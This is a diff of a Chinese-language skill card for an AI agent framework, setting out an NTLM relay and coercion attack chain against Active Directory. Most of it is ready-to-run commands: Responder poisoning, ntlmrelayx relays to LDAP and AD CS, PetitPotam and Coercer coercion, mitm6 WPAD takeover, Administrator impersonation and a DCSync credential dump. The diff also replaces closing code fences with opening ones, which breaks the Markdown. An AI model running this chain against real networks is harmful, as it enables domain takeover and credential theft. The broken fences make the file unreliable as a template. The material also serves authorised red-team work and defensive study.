@@ -4,7 +4,7 @@ description: 'NTLM Relay + Coercion 攻击链：Responder配置、ntlmrelayx Rel
 disable-model-invocation: true
 metadata: { domain: ad-win, tier: T2 }
 ---
-> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。
+> 📌 DSH 用法：按卡名用 skill 工具加载；长任务用 bash 后台任务、并行侦察用 subagent。
 
 # NTLM Relay + Coercion 攻击链 — 实战参考
 
@@ -18,13 +18,13 @@ NTLM 认证和传输协议无关。受害者向攻击者认证 → 攻击者转�
 netexec smb 10.0.0.0/24                          # 查看每个主机的 SMB signing
 netexec smb 10.0.0.0/24 --gen-relay-list targets.txt  # 自动找无签名主机
 netexec ldap 10.0.0.10                            # 查看 LDAP signing + channel binding
-```
+```text
 
 ### Responder (关闭 SMB/HTTP 服务器，只毒化不捕获)
 ```bash
 sed -i 's/SMB = On/SMB = Off/; s/HTTP = On/HTTP = Off/' /etc/responder/Responder.conf
 sudo responder -I eth0 -v
-```
+```text
 
 ### ntlmrelayx (选择 relay 目标)
 ```bash
@@ -36,19 +36,19 @@ ntlmrelayx.py -t ldap://DC --shadow-credentials --shadow-target 'DC01$'
 
 # AD CS HTTP relay → 要机器证书 (ESC8)
 ntlmrelayx.py -t http://CA/certsrv/ --adcs -smb2support
-```
+```text
 
 ### Coercion (强制目标认证到我们)
 ```bash
 coercer coerce -u u -p p -d dom --target VICTIM --listen-ip ATK    # 自动试全部 12+ 方法
 python3 PetitPotam.py ATK_IP VICTIM_IP                              # 对 DC 无需凭据！
-```
+```text
 
 ### mitm6 (IPv6 DNS 接管 → WPAD 强制认证)
 ```bash
 sudo mitm6 -d corp.local -i eth0
 ntlmrelayx.py -6 -wh attacker-wpad -t ldaps://DC --delegate-access
-```
+```text
 
 ### Relay 目标对照表
 | Relay 到 | 条件 | 攻击效果 |
@@ -74,7 +74,7 @@ getST.py -spn 'cifs/DC' -impersonate 'Administrator' -dc-ip DC 'dom/NEWCOMP$:Pas
 # 4. DCSync
 export KRB5CCNAME=Administrator@cifs_DC.ccache
 secretsdump.py -k -no-pass DC
-```
+```text
 
 ### 绕过现代防御
 - `--remove-mic` → CVE-2019-1040
